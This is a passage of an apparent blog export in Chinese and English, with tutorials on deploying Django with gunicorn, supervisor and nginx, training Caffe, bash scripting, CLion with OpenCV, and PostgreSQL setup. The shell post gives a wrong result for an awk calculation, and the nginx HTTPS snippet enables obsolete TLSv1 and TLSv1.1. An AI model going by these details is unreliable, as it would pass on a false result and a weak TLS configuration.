然后在浏览器中输入那个地址，你会看到，django相应的页面，但是没有css，也没有图片，也就是说只有动态返回的东西，所有静态的东西都没有拿到。而且你只能把端口改成本地端口，你改成局域网ip都不行（当然可以添加特例可以，不过这样就写死在你的django工程里面了，耦合太高），不加ALLOWED_HOST就会报错。好了，这就是为什么，nginx这个东西的角色很重要！！ 再思考一下，nginx在我们的整个过程中担任了一个什么样的角色呢？很简单，nginx能够捕捉到访问我这个云服务器ip的请求，这个不得了了，这个很牛逼啊，这样的话我从北京访问欧洲的云服务器，nginx就是能够给我相应的东西！！然后我们必须要知道nginx更屌的功能：非常擅长处理静态文件刚才不是gunicorn不能找到静态文件在哪里嘛？我们就用nginx来罗，nginx负责静态，gunicorn负责动态，两兄弟就能够成为最佳组合呀！ STEP 1 配置gunicorn第一步还是配置一下gunicorn，一般直接运行gunicorn的指令很简单,在工程根目录下执行：gunicorn mydjangoproject.wsgi -b 127.0.0.1:8080 -w 3 但是呢，为了方便让supervisor管理gunicorn，我们在工程根目录新建一个gunicorn.conf的配置文件，然后在指令中直接指定-c gunicorn.conf即可。如下是gunicorn.conf的内容：workers = 3bind = '127.0.0.1:8100' 这里要注意的是，bing绑定的ip一定是本地ip，因为gunicorn监听的就是本地端口，监听外网ip的任何交给nginx即可，nginx会把请求转发到本地的端口，从而被gunicorn接收到。这个端口你可以任意制定，一般就是8000，8080，8100， 8200等等。 STEP 2 配置supervisor第二步配置一下gunicorn的守护神，supervisor，这个东西的作用是保证我们的gunicorn能够随时保持运行，系统重启了会自动运行，奔溃了也会自动运行，保证django工程动态程序的持续加载。紧接着呢，没有了，直接在目录/etc/supervisor/conf.d下面新建一个属于我们gunicorn的配置文件，文件名就叫做supervisor_gunicorn_mydjangoproject.conf，内容如下：[program:oumenglite_supervisor]command=/usr/local/bin/gunicorn --chdir /home/jfg/Documents/WebSpace/oumenglite oumenglite.wsgi -c /home/jfg/Documents/WebSpace/oumenglite/gunicorn_oumenglite.confuser=nobodyautostart=trueautorestart=truestdout_logfile=/home/jfg/Documents/WebSpace/oumenglite/logs/gunicorn_supervisor.logstderr_logfile=/home/jfg/Documents/WebSpace/oumenglite/logs/gunicorn_supervisor.log 输入 sudo supervisorctl进入supervisor控制台rereadupdatestart all 这个时候我们的gunicorn就可以一直运行了！！ run forever！！！ STEP 3 配置nginx首先我们要知道nginx的配置文件路径在：/etc/nginx/ 实际上，真正的配置文件是/etc/nginx/nginx.conf这个文件，但是nginx.conf文件include了/etc/nginx/sites-enabled的配置文件，因此我们直接在/etc/nginx/sites-enabled这里面新建一个nginx的配置文件，nginx会自动include进去的，这样的话你可以新建两个，三个，都可以，不同的文件处理不同的静态文件请求，从而实现不同的网站。我们在这个目录新建一个mydjangoproject文件，不需要后缀，配置一下内容：server &#123; listen 8080; listen [::]:8080; server_name 192.168.1.118; root /var/www/jintianisme-top; index index.html; # let nginx parse url, and let all this urls # let gunicorn sovle them! location / &#123; # First attempt to serve request as file, then # as directory, then fall back to displaying a 404. proxy_pass http://127.0.0.1:8100; try_files $uri $uri/ =404; &#125; location /admin &#123; proxy_pass http://127.0.0.1:8100; &#125; location /api&#123; proxy_pass http://127.0.0.1:8100; &#125; location /static/ &#123; autoindex on; alias /home/jfg/Documents/WebSpace/oumenglite/static/; &#125; location /media/ &#123; alias /home/jfg/Documents/WebSpace/oumenglite/media/; &#125;&#125; 以下是配置说明： listen是nginx的监听端口，刚才gunicorn监听了一个端口，这个端口和gunicorn的不要一样，一般直接生产环境的话写成80，这是默认的端口 server_name可以写ip也可以写网址名称，如果写网址名称的话你就需要买个域名并把域名解析到你的ip了，或者修改本地的host可以模拟一下域名访问 root是你的网站根目录，这里我一般只用作欢迎页，真正我们的django工程目录跟这个没有半毛钱关系 location这个东西是解析url的，和django的urls有点像，支持正则，上面我的配置实现的功能是，当访问根server_name时，什么意思呢？就是在局域网其它电脑中输入：192.168.1.118时，把这个请求转发给proxy_pass,而很显然，刚才的gunicorn监听这个地址，从而会发送到gunicorn去，实现我们的请求转发，实际生产的话，把局域网ip改成外网ip就可以了。 location /static/ , location /media/是匹配静态文件的，这里写的地址就是你的django目录下的静态文件地址，注意前面和后面的下划线都要有 location /admin , location /api 匹配的是django自带的admin请求，这个请求也会直接转发给gunicorn就可以了，让gunicorn来处理 这样下来我们惊奇的发现：nginx在这里面除了处理静态请求之外真的并没有什么任何卵其它用途！！！这也是理所当然的！！ 下一步下一步干啥？我们的django工程已经上天了，手机也能访问了，接下来就是在android段测试传数据上来啦！！！！Enjoy and waite my next post!! 【UPDATE】更新一下，这是搭建云服务器的最后一步也是最重要的一步，但是你可能可以成功把网站放上去了，但是还得设置https证书，这个就比较蛋疼了。我贴一下配置文件：#配置https ssl证书ssl on;ssl_certificate 1_lewisjin.xyz_bundle.crt;ssl_certificate_key 2_lewisjin.xyz.key;ssl_session_timeout 5m;ssl_protocols TLSv1 TLSv1.1 TLSv1.2; #按照这个协议配置ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;#按照这个套件配置ssl_prefer_server_ciphers on; 但是搞完之后尼玛发现https根本无法访问啊？？尼玛傻逼了，改成了https不改端口？？？？端口一定要记得改成443啊！！！！ 然而悲伤的事，尼玛卧槽改了443还是不行啊？？？？？what the f**k？！！！","categories":[],"tags":[]},{"title":"Caffe训练自己的数据集并用Python接口预测","slug":"2017-1-6-Caffe-训练自己的数据集并用Python接口预测和批量预测","date":"2017-02-01T18:31:45.000Z","updated":"2017-02-03T02:51:20.000Z","comments":true,"path":"2017/02/02/2017-1-6-Caffe-训练自己的数据集并用Python接口预测和批量预测/","link":"","permalink":"http://yoursite.com/2017/02/02/2017-1-6-Caffe-训练自己的数据集并用Python接口预测和批量预测/","excerpt":"","text":"Caffe训练自己的数据集并用Python接口预测 本教程作者是在读硕士金天童鞋，在当地较为英俊的男子，大家对教程有任何疑问欢迎联系我：WeChatjintianiloveu，同时也欢迎大家转载评论，不过请保留这段版权信息，桑口～ Caffe安装首先还是简要的说一下Caffe在Ubuntu下的安装过程，具体安装过程如下： 安装前置依赖前置依赖项较多，好在Ubuntu下都可以通过apt下载安装，这个命令一阵复制粘帖吧：sudo apt-get upgradesudo apt-get install -y build-essential cmake git pkg-configsudo apt-get install -y libprotobuf-dev libleveldb-dev libsnappy-dev libhdf5-serial-dev protobuf-compilersudo apt-get install -y libatlas-base-devsudo apt-get install -y --no-install-recommends libboost-all-devsudo apt-get install -y libgflags-dev libgoogle-glog-dev liblmdb-dev 然后安装OpenCV3.1,这个安装已经轻车熟路了。大家对此有和疑问的查看我这个博客，找到Ubuntu下安装OpenCV的教程进行安装。接下来就简单了，不过为了防止后面导入caffe出问题，建议软链接一下这个东西：sudo ln -s /usr/lib/x86_64-linux-gnu/libboost_python-py35.so /usr/lib/x86_64-linux-gnu/libboost_python3.so 接着clone项目：git clone https://github.com/BVLC/caffe.git 然后在我的Repo里面下载Makefile和Makefile.config来替换原有的。接着就是安装python依赖，这里不要按照其他教程里面的安装官方的caffe/python下的requirement.txt，instead，下载我的，然后运行：sudo pip3 install --upgrade -r python/requirements_python3.txt 后面的requirements_python3.txt也可以从上面的Repo下载。接着直接安装就行了：make all -jmake pycaffe 测试一下是否安装成功：./data/mnist/get_mnist.sh./examples/mnist/create_mnist.sh./examples/mnist/train_lenet.sh 如果成功你就会看到caffe在训练mnist了，大概几千次之后准确度就可以达到99%，非常好。 Caffe生成并训练自己的数据集本教程所有的代码，文件目录结构可以在我的github上下载，点这里,下载之后你会看到一个完整的caffe训练架构，但是数据还得另外下载，我在这里只是上传了5类图片的样张图片，真正的数据集大概有600张的样子。下载地址为这里。接下来要生成caffe需要的数据了，步骤如下，大家先不要方，生成数据是整个过程最复杂的部分，不过这个部分也不是很麻烦，我精简一下步骤： Step 1 Generate the image name file Run caffe_path_gen.py in your terminal, just type:python3 caffe_path_gen.py -train=/home/jfg/caffe_tiny5/tiny5/train -shuffle=True -shuffle is optional, because caffe can do this too.In this tutorial we only have train data in image_data folder, we don’t have test image, so we just generate the train image path, and manully divide them into train and test. But if you have test data folder, you also can type:python3 caffe_path_gen.py -train=/home/jfg/Documents/PythonSpace/caffe_tiny5/tiny5/train -test=/home/jfg/Documents/PythonSpace/caffe_tiny5/tiny5/test -valid=/home/jfg/Documents/PythonSpace/caffe_tiny5/tiny5/valid the valid data only generate image path without labels.After this, you gonna have train.txt, words.txt. Step 2 Split train.txt into to train.txt and test.txt Before split please remove the path just make it like this:/flower/683.jpg 3/bus/334.jpg 0/bus/336.jpg 0/dinosaur/481.jpg 2/dinosaur/436.jpg 2/bus/327.jpg 0/elephant/595.jpg 4/bus/357.jpg 0/bus/393.jpg 0/bus/375.jpg 0/dinosaur/453.jpg 2/flower/654.jpg 3/dinosaur/491.jpg 2/bus/365.jpg 0/flower/636.jpg 3/flower/629.jpg 3/bus/347.jpg 0/bus/398.jpg 0/horse/761.jpg 1/elephant/560.jpg 4/dinosaur/449.jpg 2/elephant/531.jpg 4/horse/794.jpg 1/horse/743.jpg 1/elephant/586.jpg 4 But stay with the class prefix Step 3 Generate Caffe LMDB data fileFirst mkdir a data folder just inside the project directory, and place train.txt and test.txt into it.And then open caffe_create_lmdb.sh and just edit the following two lines:TRAIN_DATA_ROOT=/home/jfg/Documents/PythonSpace/caffe_tiny5/tiny5/trainVAL_DATA_ROOT=/home/jfg/Documents/PythonSpace/caffe_tiny5/tiny5/valid 在这一步中，确保TRAIN_DATA_ROOT和上面的train.txt中的文件名能够组成完整的路径即可。 Simply edit two lines, leave other along.Then type:bash caffe_create_lmdb.sh Tip: Anything wrong, check you mkdir a data folder, and have train.txt and test.txt in it.OK, after this, you gonna have two new folder in your data folder, that is:caffe_train_lmdbcaffe_val_lmdbthis is what we need to feed into caffe net and it is nothing with your original image anymore! It’s complete and clean! Do not warry about path wrong anymore! Very nice! Step 4 Generate Mean Binary FileThis step is very easy, don’t change anything ,just type this in your terminal:bash caffe_make_mean.sh And you gonna have caffe_mean.binaryproto file in your data folder. 开始Caffe训练you already have your data, just finish 80% work. 20% to go. Next, we gonna using solver folder. In this folder we have a solver.prototxt and a train_test.prototxt.solver.prototxt is the net pramas setting file.train_test.prototxt is the net structure setting file and your lmdb data feed into net in here.layer &#123; name: \"cifar\" type: \"Data\" top: \"data\" top: \"label\" include &#123; phase: TRAIN &#125; transform_param &#123; mean_file: \"/home/jfg/caffe_tiny5/data/caffe_mean.binaryproto\" &#125; data_param &#123; source: \"/home/jfg/caffe_tiny5/data/caffe_train_lmdb\" batch_size: 100 backend: LMDB &#125;&#125;layer &#123; name: \"cifar\" type: \"Data\" top: \"data\" top: \"label\" include &#123; phase: TEST &#125; transform_param &#123; mean_file: \"/home/jfg/caffe_tiny5/data/caffe_mean.binaryproto\" &#125; data_param &#123; source: \"/home/jfg/caffe_tiny5/data/caffe_val_lmdb\" batch_size: 100 backend: LMDB &#125;&#125; This 2 layer is data feed layer, so you have to change your data path in here.Make sure it correct.Open solver.prototxt, find this 2 and edit it:net: \"/home/jfg/caffe_tiny5/solver/caffenet_train_valid.prototxt\"snapshot_prefix: \"/home/jfg/caffe_tiny5/model/caffenet\" net: it is your train_test.prototxt file postion, snapshot_prefix is your save model path and prefix name, we place all saved models into a model_snapshot folder with prefix cifar10. 训练只需要一行命令：bash train_caffe.sh 重点来了，得到模型之后怎么预测这里我们使用python接口，直接上代码吧，实际上该的地方也不多：# !/usr/bin/env python# -*- coding: utf-8 -*-\"\"\"caffe_test.pyhttp://www.lewisjin.coding.me~~~~~~~~~~~~~~~This script implement by Jin Fagang.: copyright: (c) 2017 Didi-Chuxing.: license: Apache2.0, see LICENSE for more details.\"\"\"import numpy as npimport sysimport osimport cv2caffe_root = '/home/jfg/caffe/'sys.path.insert(0, caffe_root + 'python')import caffenet_file = '/home/jfg/Documents/PythonSpace/caffe_tiny5/solver/caffenet_deploy.prototxt'caffe_model = '/home/jfg/Documents/PythonSpace/caffe_tiny5/solver/model/caffenet_iter_4500.caffemodel'mean_file = '/home/jfg/Documents/PythonSpace/caffe_tiny5/data/caffe_mean.binaryproto'print('Params loaded!')caffe.set_mode_gpu()net = caffe.Net(net_file, caffe_model, caffe.TEST)mean_blob = caffe.proto.caffe_pb2.BlobProto()mean_blob.ParseFromString(open(mean_file, 'rb').read())mean_npy = caffe.io.blobproto_to_array(mean_blob)a = mean_npy[0, :, 0, 0]print(net.blobs['data'].data.shape)transformer = caffe.io.Transformer(&#123;'data': net.blobs['data'].data.shape&#125;)transformer.set_transpose('data', (2, 0, 1))transformer.set_mean('data', a)transformer.set_raw_scale('data', 255.0)transformer.set_channel_swap('data', (2, 1, 0))test_img = 'elephant.jpeg'im = caffe.io.load_image(test_img)net.blobs['data'].data[...] = transformer.preprocess('data', im)predict = net.forward()names = []with open('words.txt', 'r+') as f: for l in f.readlines(): names.append(l.split(' ')[1].strip())print(names)prob = net.blobs['prob'].data[0].flatten()print('prob: ', prob)print('class: ', names[np.argmax(prob)])img = cv2.imread(test_img)cv2.imshow('Image', img)cv2.waitKey(0) OK，本教程到此结束，欢迎乘坐本次老司机列车。这几天一直没有更新博客不是没有写，而且写了没有上传，还是得发时间整理整理，笔耕不啜才是一代文豪应该做的事情啊。 近期计划这是一个花絮，最近我还是决定干点事情了，接下来我会研究一下如何用目标检测算法来识别交通信号灯，这个在无人驾驶领域是肯定会遇到的一个问题，具体来说它有几个难点： 检测信号灯的位置 要检测信号灯就需要训练图片，标注信号灯的方框，这个好办，现有的网络可以做到很好，接下来有个问题就是第二个点。 检测信号等每个路口转向的信号等情况 比如我检测到了信号灯，但是这个信号灯是左转通行还是右转通行呢？是左转通行直行禁止右转禁止还是其他情况呢？而且我检测算法可能在一个视角中检测多个红绿灯，但是我真正感兴趣的只是我前方的红绿灯，那么如何来却分识别出来的红绿灯也是个问题。 这两个问题如何解决还得看数据标注的情况。","categories":[],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"http://yoursite.com/tags/深度学习/"}]},{"title":"Shell program from newbie to give up series","slug":"2017-1-17-Shell编程从入门到放弃系列","date":"2017-02-01T12:31:45.000Z","updated":"2017-02-03T02:51:25.000Z","comments":true,"path":"2017/02/01/2017-1-17-Shell编程从入门到放弃系列/","link":"","permalink":"http://yoursite.com/2017/02/01/2017-1-17-Shell编程从入门到放弃系列/","excerpt":"","text":"Shell program from newbie to give up series This is a tutorial about shell program, powerful and faster your work on anywhere, so learn it hard, once you handler it, you can become a geek. If you have any question about this post, you can contact me via wechat: jintianiloveu , if you repost please stay with this copyright annoncement, enjoy :) Chapter 1 File Relatedok, in this chapter, the most important and you maybe face with most is file process, such as walk an directory or get all file names in a folder etc. Here I am going write down some useful shell commonds that will hopefully faster your work, even every faster ever than you think. get all files and directoriesHere is one single script:# !/bin/bashfor file in ~/home/datado echo $&#123;file&#125;done That’s it, you can access every file in a directory, if you want get both file and dirs, try this:all=`ls ~/home/data`for f in alldo if [ -d $f ]; then echo $&#123;f&#125;\" is a directory\" else echo $&#123;f&#125;\" is a file\" fi file names and path relatedMost of the time we are annoying with file names and path, sometimes we want get the file name and another time we want the path. So here you cant use 2 powerful commod to solve all problems. They are basename and dirname. Look this example: cycle all names under an (or 2) folderThis is a very instresting question. for item in .. this style is very usefule but we can’t cycle 2 items at the same time, indeed we will have this inquirement sometimes. Here I am going solver this using an example:concate 2 folder’s file names into a txt file, say, folder1 have 1.jpg 2.jpg …, and folder2 have 1.txt 2.txt 3.txt…we gonna generate a txt file like this: 1.jpg 1.txt2.jpg 2.txt... abviously, we have to cycle 2 elements at same time. But! For now we have no method to cycle 2 items in for..in.. So we have to change our plan:We can store the ls |grep &#39;^-&#39; out put into array or list, so we can get them in one for cycle. Here is the script:j=0for img in `ls $&#123;data_root_dir&#125;/Images|sort -h`do img_list[$&#123;j&#125;]=$&#123;img&#125; ((j++))donek=0for label in `ls $&#123;data_root_dir&#125;/Labels|sort -h`do label_list[$&#123;k&#125;]=$&#123;label&#125; ((k++))doneecho $&#123;img_list[0]&#125;echo $&#123;label_list[0]&#125;for ((i=1;i&lt;=$&#123;#img_list[@]&#125;;i++))do echo $i left=$&#123;img_list[i]&#125; right=$&#123;label_list[i]&#125; echo $&#123;left&#125;\" \"$&#123;right&#125;done This code is a little dumped, but I think you can quite get what this means. Chapter 2 About txt file processtxt file is the most simple and wide-use file format, handler how to operate them will gaintly faster your work, and make you seems like a god! Witre lines into txt fileThis is the most basic part of all jobs, and still, the most important. This 2 commond you must remember into your heart:echo \"Hello, world.\" &gt; ~/data/test.txtecho \"Hello, world.\" &gt;&gt; ~/data/test.txt&gt;: ~/data/test.txt first line: overwrite a string into a filesecond line: add a line into a filelast line: truncate all content in a text fileAbove is all the basic commond you have to handler, is simple yet powerful! Generate a random arrayok, another useful general commond that you maybe use all the time, but I think this is not the most simplest way to do this, the purpose is generate a random int array, so that use this we can shuffle txt lines or other things, here is the script:length_imgs=570arr=(`seq $&#123;length_imgs&#125;`)for ((i=0;i&lt;10000;i++))do let \"a=$RANDOM%$&#123;length_imgs&#125;\" let \"b=$RANDOM%$&#123;length_imgs&#125;\" tmp=$&#123;arr[$a]&#125; arr[$a]=$&#123;arr[$b]&#125; arr[$b]=$tmpdoneecho $&#123;#arr[@]&#125; if we get this random array, we can read random lines into a new txt file , liek this:boundry=20for i in $&#123;arr[@]:$&#123;boundry&#125;&#125;do sed -n \"$&#123;i&#125;p\" test.txt &gt;&gt; newtest.txtdone It’s simple enough! Now we have some random lines in newtest.txt Cut stringVery important part, to cut a string whatever we want is a very useful commond! And what you need is only one single cmoond cut. Chapter 3 About MathmaticWell, I have to say this part is a litter complicated, onething you must take in your mind is that Shell Does Not Support Decimal Calculate, though we still can find some method to approach our goal, one properly method is awk.If you want to calculate 0.8x6 , you probbly can do those: $((0.8*6)) echo expr 0.8*6But you wont get what you want, because shell doesn’t support it. But hopefully you can do this:echo | awk '&#123;print 0.8*6&#125;' you will got 4.2","categories":[],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"http://yoursite.com/tags/深度学习/"}]},{"title":"Django 5 nginx gunicorn以及django的三兄弟","slug":"Django-5-nginx-gunicorn-make-django-project-on-cloud","date":"2017-02-01T06:14:42.000Z","updated":"2017-02-02T06:45:06.000Z","comments":true,"path":"2017/02/01/Django-5-nginx-gunicorn-make-django-project-on-cloud/","link":"","permalink":"http://yoursite.com/2017/02/01/Django-5-nginx-gunicorn-make-django-project-on-cloud/","excerpt":"","text":"本文将介绍使用nginx和gunicorn搭建我们的django服务器，直接把应用上云！ 废话不多说，开车前系紧安全带首先还是啰嗦一句把，在选择一个web容器的时候我们要选择一对好兄弟，很显然，nginx的大名世人皆知，当然我之前一只听说的是apache，不过apache和java可能搭配的更多，nginx呢和django可以说是一对搭档很好的兄弟，nginx在处理静态请求方面的性能很屌，那么问题来了，动态处理是用uwsgi呢还是gunicorn呢，我选择了gunicorn，为什么呢？因为这个名字听起像个gay。既然是gay了那应该可以和django好好的搞基.. 安装nginx好了，直接安装nginx把，这个nginx不像其它容器庞然大物，显得很小，ubuntu下直接：sudo apt install nginx 启动nginx服务器sudo /etc/init.d/nginx start# or this commandsudo service nginx start 请注意，nginx的配置文件是在这个目录里面cd /etc/nginx 如果是Mac，则默认的nginx安装目录应该是：/usr/local/opt/nginx 要启动nginx，这也即可：sudo nginx 即可。Mac下的nginx，配置文件目录在这里：/usr/local/etc/nginx 无论是ubuntu还是Mac，nginx的配置都在 ／etc/nginx 下面，只是ubuntu直接在这下面，Mac放到了/usr/local下面 TIPS: nginx在ubuntu下默认监听的是80端口，而在mac下监听的是8080端口，因此你在ubuntu下测试nginx的欢迎页面时，可能只需要输入localhost即可，但是在mac下你必须要加上8080端口号，注意80是系统默认的监听端口，如果你要修改ubuntu下的监听端口号，比如改成8080，那么你就需要修改/etc/nginx/sites-available下的default文件，不过事先还是先备份一下原来的那个。 最后插播一个东西，vim有时候你没有sudo打开需要权限的文件，改完了之后才发现要权限，然后退不出来，退出来了改完的文件就没有了，相当的蛋疼，这个时候你就需要使用这条命令：:w !sudo tee % 不过要注意空格不能少，而且sudo要紧跟在感叹号后面，就这也就可以保存了。最后补充一句，ngxin在Mac下和ubuntu下配置还是略有不通，ubuntu在／etc/nginx/sites-available/文件夹下有单独的配置文件来配置监听端口，而mac下是直接集成到了/usr/local/etc/nginx下的nginx.cnf中。 配置一下gunicore首先在运行gunicore之前我们要配置一下django工程下的静态文件的路径，也就是STATIC_URL and STATIC_ROOT 这俩个变量，直接在setting.py下面设置：STATIC_ROOT = os.path.join(BASE_DIR, 'static')STATIC_URL = '/static/' 然后还有一件事情，在工程中运行：python3 manage.py collectstatic 这个命令会在工程根目录下生成一个static目录，并把所有的静态文件放在这下面，不过说实话如果你的django工程是一个移动app的服务器而不是网页的话，这个可能没有多大的作用，如果是网页这就直接影响到你网页的css等文件的正确加载了，一定不要忘记这个步骤。 这次我们来测试一下gunicore对我们django的支持怎么样，其实说白了，gunicore就是代替django原生的那个小服务器的作用。但是实际生成中肯定不能用那个小服务器，还是让更加专业的gunicore来把。运行：gunicore --bind 0.0.0.0:8000 yourdjangoprojectc.wsgi:application 这个命令就和python3 manage.py runserver是一样的。 OK！准确的说你已经完成了django的上线准备！nginx准备就绪，gunicore准备就绪！ Django大兄弟，上天吧这个教程就到这里吧，到现在才发现搭建nginx和gunicorn并没有那么简单，为此我会单独开一个post了记录这个过程。除此之外呢，基本上下个过程就是你想要的啦，保证可以学会nginx和python web环境搭建。","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"http://yoursite.com/tags/Django/"}]},{"title":"Ubuntu下用Clion和C++开发OpenCV程序教程","slug":"2017-1-6-OpenCV-Clion-C++-开发环境搭建教程","date":"2017-02-01T02:31:45.000Z","updated":"2017-02-03T02:51:32.000Z","comments":true,"path":"2017/02/01/2017-1-6-OpenCV-Clion-C++-开发环境搭建教程/","link":"","permalink":"http://yoursite.com/2017/02/01/2017-1-6-OpenCV-Clion-C++-开发环境搭建教程/","excerpt":"","text":"Ubuntu下用Clion和C++开发OpenCV程序教程 本教程作者是在读硕士金天童鞋，在当地较为英俊的男子，大家对教程有任何疑问欢迎联系我：WeChatjintianiloveu，同时也欢迎大家转载评论，不过请保留这段版权信息，桑口～ 前言在开车之前必须要扯几句，好多天没有更新博客，你在我的官网，或者简书上都看不到我最近的活动，最近在忙着搞无人驾驶，虽然官方博客没有更新但是在github上却有很多小项目，首先放出我的github地址，这里，这几天写了一个爬虫爬取12306网站的脚本，直接在terminal显示余票信息，并可以智能提醒你余票，过年了，有想玩的同学们可以star一下我的这个项目12306爬虫欢迎大家star，多多益善啊我的星星实在是太少了。好了不扯淡了，蛋也快碎了。让我们直接开车吧。 OpenCV在Ubuntu下安装这个大家可以去我前几篇博客上找一下，我写了一篇较为详细的OpenCV3.1编译的文章，总的来说，在Ubuntu下编译比较简单，直接clone项目，设定cmake参数，直接make all -j8就行了，然后install。这里简要lveguo（我打不出那个字，日了狗了）。 Clion上手Clion是Jetbrain公司开发的C++IDE，秉承了Jetbrain一系IDE美观强大的风格，比其某VC，某Qt，某CMake强大很多，然而要上手对于新手来说还是有点麻烦，首先就是这个CMakelists，你不知道怎么配置，太鸡巴麻烦了，我配置了一下午，TMD，真的是日了藏獒，后来发现还是人家OpenCV好，实际上OpenCV已经把CMakelist的样本放到了example文件夹下，我TM是当时瞎了够眼，没有看到，最后灵机一动，突然想起来，发现还真的有。 Clion配置CMakelists.txt来导入OpenCV怎么说，貌似你不在CMakelists里面导入OpenCV相关包你是无法通过编译的，会报错，先话不多说，加入你新建了一个Project叫做VisionTest,下面的主函数cpp名字叫做main，那么CmakeLists.txt这么配置：cmake_minimum_required(VERSION 3.6)project(VisionTest)find_package(OpenCV REQUIRED)message(STATUS \"OpenCV library status:\")message(STATUS \" version: $&#123;OpenCV_VERSION&#125;\")message(STATUS \" libraries: $&#123;OpenCV_LIBS&#125;\")message(STATUS \" include path: $&#123;OpenCV_INCLUDE_DIRS&#125;\")include_directories($&#123;OpenCV_INCLUDE_DIRS&#125;)set(CMAKE_CXX_STANDARD 11)set(SOURCE_FILES main.cpp)add_executable(vision_test main.cpp)target_link_libraries(vision_test $&#123;OpenCV_LIBS&#125;) 这里有个重点，最后两行一定要有，而且顺序不能变，这是告诉Cmake，你把main.cpp编译成了一个可执行文件vision_test,然后你要让这个可以执行的文件去连接OpenCV的动态库，如果你在没有add_executable就去添加链接就会报错。谨慎啊，少年，小心使得万年船啊！ C++ OpenCV测试程序示例OK，现在我们配置了Cmake，接下来在main.cpp中输入以下代码：#include &lt;iostream&gt;#include &lt;vector&gt;#include \"opencv2/core/core.hpp\"#include \"opencv2/opencv.hpp\"#include \"opencv2/highgui/highgui.hpp\"using namespace std;int main() &#123; cout &lt;&lt; \"Hello, this is opencv tutorial.\" &lt;&lt; std::endl; cv::Mat img = cv::imread(\"/home/jfg/Pictures/cat.jpeg\"); cv::namedWindow(\"Window\", CV_WINDOW_AUTOSIZE); cv::imshow(\"Cat\", img); cv::waitKey(0); return 0;&#125; 这是一个简单的OpenCV测试程序，要注意的一点是，图片的路径要使用绝对路径，不要使用相对路径，否则会出错。 OpenCV MoveOn其实写这个博客的目的并不是上手OpenCV，基于Linux来做OpenCV编程是因为，我想让OpenCV和硬件结合起来，最理想的方案就是树莓派了，这样通过Linux系统我们就可以让上位机和下位机连接起来，使用这个再加上独门绝迹，深度学习目标检测以及表情识别，想想还是很6的！！ 人工智能机器人Teroi我决定把我的第一台人工智能机器人名字叫做Teroi，意思是：The Emotional Robot Improved.大家觉得怎么样？","categories":[],"tags":[{"name":"深度学习","slug":"深度学习","permalink":"http://yoursite.com/tags/深度学习/"}]},{"title":"Django 4 django和postgreSQL","slug":"Django-4-django和postgreSQL","date":"2017-01-26T10:41:45.000Z","updated":"2017-02-02T13:23:06.000Z","comments":true,"path":"2017/01/26/Django-4-django和postgreSQL/","link":"","permalink":"http://yoursite.com/2017/01/26/Django-4-django和postgreSQL/","excerpt":"这个教程是要换数据库了，从mysql换到postgresql。说实话我个人以后决定使用postgresql，比mysql方便很多。","text":"这个教程是要换数据库了，从mysql换到postgresql。说实话我个人以后决定使用postgresql，比mysql方便很多。 本文由作者金天原创，欢迎大家转载，不过请保留这段版权信息，多谢合作，如对本文有任何问题欢迎联系作者: jintianiloveu。 postgresql安装教程在这插入一下安装过程，之前安装了现在又重新搭建一遍所以记录一下，其实不管是Mac还是Linux都很简单，直接安装：# macbrew install postgresql# ubuntusudo apt install postgresql 当然除了安装数据库之外，还要安装我们需要的python适配器，从而在django中可以调用它，这里我们安装在virtualenv中把，但是之前一直没有用这个，现在也赶一下时髦用一下，其实大家如果不习惯用的话也没有关系，可以直接安装在系统的python目录下。pip3 install psycopg2 这个包是django用来和postgresql通信的python包，如果不安装的话会报错提醒你的。注意在这里django默认使用了pillow来处理图片，因此在安装psycopg2的时候可以顺便把pillow安装一下，搞深度学习的应该都知道这个包，也就是python3下的pil。pip3 install pillow postgresql一分钟入门前几个教程一直是灌输mysql和django的知识，两个人其实配合的很好，今天突然来了第三者，大家可能会有点接受不了。容我解释一下，首先我觉得到目前为止转换的成本其实是很低的，你只需要卸载mysql，重新安装postgresql就可以了。所有的数据都还不多，无所谓。这里说明下我最终选择postgresql的原因： 安装简单，没有复杂的密码，访问数据库和表简单 开源就不说了 和django搭配很友好，django其实官方是支持postgresql的 最后还有一个很重要的原因就是：尼玛，sb mysql mac下每次重启系统就重置密码是鸡巴几个意思，shit，气得我直接抛弃了这个二笔 。 postgresql简单实用教程：# 创建一个用户sudo -u postgres createuser --superuser jfg# 以postgres身份进入postgresql控制台sudo -u postgres psql# 新建一个数据库sudo -u postgres createdb -O jfg oumenglite 执行上面这些命令你可能觉得一头雾水，下面是postgresql的几条设计逻辑： postgresql是系统级的认证，就是你系统的用户名如果和postgresql用户名相同，则postgresql就不会进行第二步验证 postgresql实行的是每个数据库不同管理员制，也就是说你可以为每个数据库单独设置管理员 好了了解了上面两条逻辑，下面运行和几个命令，首先我们创建一个和当前系统用户名相同的postgresql用户，创建完之后你的系统用户就是postgresql的超级用户，不用指定用户也不用输入密码，方便快捷：sudo -U postgres createuser --superuser yoursysusername 这样你就可以直接输入psql来操作数据库了。 [UPDATE 2017-02-1] 更官方的的postgresql使用应该是这样的，你安装完之后会有一个默认的用户postgres，然后：sudo su postgrescreateuser --interactive -P 这是会提示你创建一个新的用户，然后：createdb --owner yourjusttypename databasename django和postgresql之歌现在django之歌要改成django和postgresql之歌了。我们所有的数据都将基于postgresql来构建，我们插入几条数据来看看显示效果：from users_user; 1 | 金天 | 男 | 1993-12-11 | | | | lewisjin@outlook.com | | | 长沙 | 2 | 小芳 | 女 | 1993-12-11 | | | | xiaof@qq.com | | | 北京 | 3 | 刘明 | 男 | 1993-12-11 | | 浙江 | 15116378920 | xiaof@qq.com | | | 北京 | 感觉数据多的情况下，postgresql的控制台显示效果都比mysql的好，而且你上手postgresql只需要知道这么几条命令就够了：# 新建数据库createdb ara# 选择数据库psql ara# 显示所有数据库psql -l# 显示数据库下的所有表\\d 就是这么simple。你已经从mysql转移到了postgresql！ django继续我们的api时隔很久了，这个教程只要继续我们的django代建restful api的伟大事业。","categories":[],"tags":[{"name":"Django","slug":"Django","permalink":"http://yoursite.com/tags/Django/"}]},{"title":"Django 3 分分钟搭建一个RESTful API","slug":"Django-3-分分钟搭建一个RESTful-API","date":"2017-01-16T15:31:58.000Z","updated":"2017-01-26T10:42:16.000Z","comments":true,"path":"2017/01/16/Django-3-分分钟搭建一个RESTful-API/","link":"","permalink":"http://yoursite.com/2017/01/16/Django-3-分分钟搭建一个RESTful-API/","excerpt":"","text":"Django restframework 